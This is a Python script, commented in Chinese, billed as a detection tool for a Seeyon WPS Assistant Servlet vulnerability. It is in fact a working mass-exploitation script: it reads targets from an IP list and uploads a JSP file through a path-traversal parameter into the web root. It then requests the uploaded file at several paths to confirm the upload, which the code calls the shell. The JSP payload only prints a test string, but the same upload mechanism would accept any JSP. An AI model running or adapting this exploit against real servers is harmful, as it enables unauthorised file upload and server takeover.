#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Seeyon WPS漏洞检测主脚本
从ip.txt读取目标IP列表并进行漏洞检测
"""

import os
import sys
import requests
import time
import urllib3
import argparse

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_seeyon_wps_vulnerability(host, port=80):
    """
    测试单个目标的Seeyon WPS漏洞
    """
    # 构造目标URL
    if port == 443:
        base_url = f"https://{host}"
    elif port == 80:
        base_url = f"http://{host}"
    else:
        base_url = f"http://{host}:{port}"
    
    # 漏洞利用路径和参数
    exploit_path = "/seeyon/wpsAssistServlet"
    params = {
        'flag': 'save',
        'realFileType': '../../../../ApacheJetspeed/webapps/ROOT/Hello.jsp',
        'fileId': '2'
    }
    
    # 构造multipart form data
    boundary = "59229605f98b8cf290a7b8908b34616b"
    jsp_payload = '<% out.println("HelloWorld");%>'
    
    multipart_data = f"""--{boundary}\r
Content-Disposition: form-data; name="upload"; filename="123.xls"\r
Content-Type: application/vnd.ms-excel\r
\r
{jsp_payload}\r
--{boundary}--\r
"""
    
    headers = {
        'Host': host,
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Connection': 'close'
    }
    
    try:
        print(f"[*] 测试目标: {host}:{port}")
        
        # 发送漏洞利用请求
        session = requests.Session()
        session.verify = False
        
        url = base_url + exploit_path
        response = session.post(
            url,
            params=params,
            data=multipart_data.encode('utf-8'),
            headers=headers,
            timeout=10,
            allow_redirects=False
        )
        
        print(f"[*] 响应状态码: {response.status_code}")
        print(f"[*] 响应长度: {len(response.content)} bytes")
        
        # 检查响应
        if response.status_code in [200, 302]:
            # 尝试访问上传的文件
            shell_paths = [
                "/Hello.jsp",
                "/ROOT/Hello.jsp", 
                "/ApacheJetspeed/webapps/ROOT/Hello.jsp"
            ]
            
            for shell_path in shell_paths:
                try:
                    shell_url = base_url + shell_path
                    shell_response = session.get(shell_url, timeout=5)
                    
                    if shell_response.status_code == 200:
                        content = shell_response.text
                        if "HelloWorld" in content:
                            print(f"[+] 漏洞利用成功! 文件已上传: {shell_url}")
                            print(f"[+] 响应内容: {content}")
                            return True, shell_url
                except:
                    continue
            
            # 检查是否有其他成功指示
            if response.status_code == 200:
                print(f"[?] 可能成功上传，但无法直接访问文件")
                print(f"[*] 响应内容预览: {response.text[:200]}...")
                return True, None
                
        print(f"[-] 漏洞利用失败")
        return False, None
        
    except requests.exceptions.ConnectTimeout:
        print(f"[-] 连接超时: {host}:{port}")
    except requests.exceptions.ConnectionError:
        print(f"[-] 连接失败: {host}:{port}")
    except Exception as e:
        print(f"[-] 测试异常: {e}")
        
    return False, None

def load_ip_list(filename="ip.txt"):
    """
    从文件加载IP列表
    """
    if not os.path.exists(filename):
        print(f"[!] IP文件不存在: {filename}")
        return []
        
    ips = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # 支持 IP:PORT 格式
                    if ':' in line:
                        host, port = line.split(':', 1)
                        ips.append((host.strip(), int(port)))
                    else:
                        ips.append((line, 80))
    except Exception as e:
        print(f"[!] 读取IP文件错误: {e}")
        
    return ips

def main():
    """
    主函数
    """
    parser = argparse.ArgumentParser(description='Seeyon WPS Assistant Servlet 漏洞检测工具')
    parser.add_argument('-f', '--file', default='ip.txt', help='IP列表文件 (默认: ip.txt)')
    parser.add_argument('-o', '--output', help='输出结果文件')
    
    # 如果没有提供命令行参数，从项目根目录查找ip.txt
    if len(sys.argv) == 1:
        # 获取项目根目录
        current_dir = os.path.dirname(os.path.abspath(__file__))
        parent_dir = os.path.dirname(current_dir)
        ip_file = os.path.join(parent_dir, 'ip.txt')
        
        print("=" * 60)
        print("Seeyon WPS Assistant Servlet 漏洞检测工具")
        print("警告: 此工具仅用于授权的安全测试!")
        print("=" * 60)
        
        # 加载IP列表
        targets = load_ip_list(ip_file)
        if not targets:
            print(f"[!] 未找到有效的IP列表，请创建 {ip_file} 文件")
            print("[!] 文件格式: 每行一个IP或IP:PORT")
            return
            
        print(f"[*] 从 {ip_file} 加载了 {len(targets)} 个目标")
        
        # 结果记录
        vulnerable_targets = []
        
        # 逐个测试目标
        for i, (host, port) in enumerate(targets, 1):
            print(f"\n[{i}/{len(targets)}] " + "="*40)
            
            success, shell_url = test_seeyon_wps_vulnerability(host, port)
            if success:
                vulnerable_targets.append((host, port, shell_url))
                
            # 避免请求过快
            time.sleep(1)
        
        # 输出结果汇总
        print("\n" + "="*60)
        print("检测结果汇总:")
        print("="*60)
        print(f"[*] 总检测目标: {len(targets)}")
        print(f"[*] 存在漏洞: {len(vulnerable_targets)}")
        
        if vulnerable_targets:
            print("\n存在漏洞的目标:")
            for host, port, shell_url in vulnerable_targets:
                if shell_url:
                    print(f"  - {host}:{port} -> {shell_url}")
                else:
                    print(f"  - {host}:{port} -> 可能存在漏洞")
    else:
        # 使用命令行参数
        args = parser.parse_args()
        print("使用命令行参数模式...")
        # 这里可以添加更详细的命令行处理逻辑

if __name__ == "__main__":
    main()